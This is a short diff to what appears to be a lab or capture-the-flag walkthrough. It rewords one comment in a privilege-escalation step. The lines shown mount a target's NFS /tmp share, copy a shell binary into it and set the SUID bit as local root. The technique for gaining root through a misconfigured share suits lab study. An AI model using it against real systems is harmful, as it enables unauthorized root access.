@@ -108,7 +108,7 @@ sudo mount -t nfs 10.129.2.210:/tmp priv_esc/
 cp shell priv_esc/
 cd priv_esc/
 su root
-chmod u+s shell <-- Make sure you are the root user locally
+chmod u+s shell <-- Make sure you are root locally
 ```
 
 Back on target:
